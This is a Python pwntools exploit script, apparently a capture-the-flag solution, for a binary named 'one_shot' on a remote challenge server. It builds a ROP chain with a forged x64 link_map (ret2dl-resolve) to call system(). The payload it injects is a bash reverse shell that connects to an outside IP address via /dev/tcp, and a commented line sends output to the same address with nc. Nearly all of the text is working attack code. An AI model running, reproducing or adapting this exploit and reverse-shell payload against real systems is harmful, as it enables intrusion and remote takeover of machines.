#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./one_shot"
elf=ELF(pwn_file)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team",22040)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def ret2dl_resolve_linkmap_x64(ELF_obj,known_offset_addr,two_offset,linkmap_addr):
    '''
    WARNING: assert *(known_offset_addr-8) & 0x0000ff0000000000 != 0 
    WARNING: fake_linkmap is 0x100 bytes length,be careful
    WARNING: two_offset = target - *(known_offset_addr)

    _dl_runtime_resolve(linkmap,reloc_arg)
    reloc_arg=0

    linkmap:
    0x00: START
    0x00: l_addr = two_offset
    0x08: fake_DT_JMPREL : 0
    0x10: fake_DT_JMPREL : p_fake_JMPREL
    0x18: fake_JMPREL = [p_r_offset,r_info,append],p_r_offset
    0x20: r_info
    0x28: append
    0x30: r_offset
    0x38: fake_DT_SYMTAB: 0
    0x40: fake_DT_SYMTAB: known_offset_addr-8
    0x48: /bin/sh(for system)
    0x68: P_DT_STRTAB = linkmap_addr(just a pointer)
    0x70: p_DT_SYMTAB = fake_DT_SYMTAB
    0xf8: p_DT_JMPREL = fake_DT_JMPREL
    0x100: END
    '''
    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr

    linkmap=""
    linkmap+=p64(two_offset&(2**64-1))
    linkmap+=p64(0)+p64(linkmap_addr+0x18)
    linkmap+=p64((linkmap_addr+0x30-two_offset)&(2**64-1))+p64(0x7)+p64(0)
    linkmap+=p64(0)
    linkmap+=p64(0)+p64(known_offset_addr-8)
    linkmap+='/bin/sh\x00'#for system offset 0x48
    linkmap = linkmap.ljust(0x68,'\x00')
    linkmap+=p64(linkmap_addr)
    linkmap+=p64(linkmap_addr+0x38)
    linkmap = linkmap.ljust(0xf8,'\x00')
    linkmap+=p64(linkmap_addr+8)

    resolve_call = p64(plt0+6)+p64(linkmap_addr)+p64(0)
    return (linkmap,resolve_call)

pop_rdi_ret = 0x0000000000400843
pop_rsi_r15_ret = 0x400841
bss = 0x601000
trans_addr = bss + 0x600
linkmap_addr = 0x601700 # gdb得到 #bss + 0x800
shell = 'bash -c \"/bin/bash -i > /dev/tcp/118.89.101.128/1234 0<&1 2<&1\"\x00'
# shell = "/bin/sh\x00-c\x00echo 'hello world'|nc 118.89.101.128 1234\x00"
shell_addr = linkmap_addr - 0xe0

# write_gadgets = 0x400695
write_gadgets = 0x400684

system_offset = libc.sym['system'] - libc.sym['read']
read = 0x601030
(linkmap,resolve_call) = ret2dl_resolve_linkmap_x64(elf, read, system_offset,linkmap_addr)

save_rbp = bss + 0x200
pop_rbp_ret = 0x4005c0

rbp =0x400110 + 0xc #0x260
set_eax  = 0x4006f7 ### mov eax, dword ptr [rbp - 0xc] ; pop rbx ; pop rbp ; ret

v9 = 0x8A919FF0
payload = p32(v9)
payload = payload.ljust(0x24, 'a')
payload+= shell
payload = payload.ljust(0x80, '\x00')
payload+= p64(rbp)
payload+= p64(set_eax) + p64(0) + p64(save_rbp)
payload+= p64(pop_rsi_r15_ret) + p64(trans_addr) + p64(0)
payload+= p64(write_gadgets) + p64(0)+p64(0)
payload+= p64(pop_rdi_ret) + p64(shell_addr) + resolve_call + p64(0x400700)
payload = payload.ljust(0x104,'*')
payload+= linkmap
r.sendline(payload)

r.interactive()
